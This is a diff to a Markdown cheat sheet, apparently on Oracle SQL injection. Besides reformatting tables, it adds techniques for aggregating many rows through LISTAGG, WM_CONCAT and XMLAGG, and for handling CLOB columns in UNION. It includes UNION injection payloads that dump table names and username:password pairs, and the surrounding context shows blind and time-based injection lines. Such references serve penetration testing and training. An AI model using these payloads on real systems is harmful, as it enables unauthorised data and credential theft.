@@ -22,15 +22,15 @@ SELECT user FROM dual        -- Get current user
 
 ### Current Context
 
-| Query | Description |
-|-------|-------------|
-| `SELECT user FROM dual` | Current user |
-| `SELECT SYS.DATABASE_NAME FROM dual` | Database name |
-| `SELECT global_name FROM global_name` | Global name |
-| `SELECT name FROM V$DATABASE` | Database name |
-| `SELECT instance_name FROM V$INSTANCE` | Instance |
-| `SELECT ora_database_name FROM dual` | Database name |
-| `SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual` | Client IP |
+| Query                                                  | Description   |
+| ------------------------------------------------------ | ------------- |
+| `SELECT user FROM dual`                                | Current user  |
+| `SELECT SYS.DATABASE_NAME FROM dual`                   | Database name |
+| `SELECT global_name FROM global_name`                  | Global name   |
+| `SELECT name FROM V$DATABASE`                          | Database name |
+| `SELECT instance_name FROM V$INSTANCE`                 | Instance      |
+| `SELECT ora_database_name FROM dual`                   | Database name |
+| `SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual` | Client IP     |
 
 ### Database Enumeration
 
@@ -69,16 +69,84 @@ SELECT username FROM user_role_privs WHERE granted_role='DBA'
 
 ## String Functions
 
-| Function | Example | Result |
-|----------|---------|--------|
-| Concat | `'a'\|\|'b'` | `ab` |
-| `CONCAT` | `CONCAT('a','b')` | `ab` |
-| `SUBSTR` | `SUBSTR('hello',1,3)` | `hel` |
-| `LENGTH` | `LENGTH('hello')` | `5` |
-| `ASCII` | `ASCII('A')` | `65` |
-| `CHR` | `CHR(65)` | `A` |
-| `INSTR` | `INSTR('hello','l')` | `3` |
+| Function  | Example                    | Result  |
+| --------- | -------------------------- | ------- |
+| Concat    | `'a'\|\|'b'`               | `ab`    |
+| `CONCAT`  | `CONCAT('a','b')`          | `ab`    |
+| `SUBSTR`  | `SUBSTR('hello',1,3)`      | `hel`   |
+| `LENGTH`  | `LENGTH('hello')`          | `5`     |
+| `ASCII`   | `ASCII('A')`               | `65`    |
+| `CHR`     | `CHR(65)`                  | `A`     |
+| `INSTR`   | `INSTR('hello','l')`       | `3`     |
 | `REPLACE` | `REPLACE('hello','l','x')` | `hexxo` |
+
+### String Aggregation (Concatenating Multiple Rows)
+
+**⚠️ Important:** `CONCAT()` only accepts **2 parameters**, NOT subqueries with multiple rows!
+
+#### ❌ WRONG - This will fail:
+
+```sql
+SELECT CONCAT((SELECT table_name FROM all_tables))
+-- Error: ORA-01427: single-row subquery returns more than one row
+```
+
+#### ✅ CORRECT - Use LISTAGG() or XMLAGG():
+
+```sql
+-- Method 1: LISTAGG() - Recommended (Oracle 11g+)
+SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
+
+-- Method 2: WM_CONCAT() - Deprecated but works
+SELECT WM_CONCAT(table_name) FROM user_tables
+
+-- Method 3: XMLAGG() + XMLType
+SELECT RTRIM(XMLAGG(XMLELEMENT(e,table_name,',').EXTRACT('//text()') ORDER BY table_name).GetClobVal(),',') FROM user_tables
+
+-- In UNION context (requires FROM dual):
+' UNION SELECT 1,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables--
+' UNION SELECT 1,WM_CONCAT(table_name) FROM user_tables--
+```
+
+#### Common Use Cases:
+
+```sql
+-- List all tables
+SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM user_tables
+
+-- List all columns from a table
+SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name)
+FROM all_tab_columns WHERE table_name='USERS'
+
+-- Extract data from multiple rows
+SELECT LISTAGG(username || ':' || password, '|') WITHIN GROUP (ORDER BY username) FROM users
+
+-- List all table owners (schemas)
+SELECT LISTAGG(DISTINCT owner, ',') WITHIN GROUP (ORDER BY owner) FROM all_tables
+
+-- With ROWNUM limit to avoid "result of string concatenation is too long"
+SELECT WM_CONCAT(table_name) FROM (SELECT table_name FROM user_tables WHERE ROWNUM <= 100)
+```
+
+#### Handling CLOB Columns in UNION:
+
+Oracle **does NOT support CLOB** directly in UNION. Solutions:
+
+```sql
+-- Method 1: CAST to VARCHAR2
+SELECT id,name,CAST(description AS VARCHAR2(4000)) FROM products
+UNION
+SELECT 1,'test','desc' FROM dual
+
+-- Method 2: Use TO_CLOB() for other side
+SELECT id,name,description FROM products
+-- Cannot UNION with non-CLOB! Must avoid UNION if CLOB exists
+
+-- Method 3: Extract without CLOB column
+SELECT id,name,price FROM products WHERE id = 0
+UNION
+SELECT id,secret_name,1 FROM secrets
+```
 
 ## Comment Syntax
 
@@ -169,8 +237,8 @@ Remember: Oracle needs `FROM dual` even in UNION:
 ' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64--
 
 -- Time-based (using heavy query)
-' AND (SELECT CASE WHEN (1=1) THEN 
-  (SELECT COUNT(*) FROM all_users a,all_users b) 
+' AND (SELECT CASE WHEN (1=1) THEN
+  (SELECT COUNT(*) FROM all_users a,all_users b)
   ELSE 0 END FROM dual)>0--
 ```
 
